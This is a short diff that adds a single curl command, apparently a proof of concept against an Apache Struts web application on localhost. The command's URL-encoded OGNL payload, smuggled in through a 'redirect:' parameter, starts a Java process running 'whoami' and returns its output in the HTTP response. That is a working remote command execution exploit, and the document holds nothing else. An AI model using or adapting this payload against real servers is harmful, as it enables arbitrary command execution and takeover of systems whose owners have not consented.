@@ -1,0 +1,2 @@
+curl -XPUT 127.0.0.1:8080/index.action  \
+-d"redirect%3A%24%7B%23a%3D%28new+java.lang.ProcessBuilder%28new+java.lang.String%5B%5D+%7B%27whoami%27%7D%29%29.start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23c%3Dnew+java.io.InputStreamReader+%28%23b%29%2C%23d%3Dnew+java.io.BufferedReader%28%23c%29%2C%23e%3Dnew+char%5B50000%5D%2C%23d.read%28%23e%29%2C%23matt%3D+%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println+%28%23e%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D"
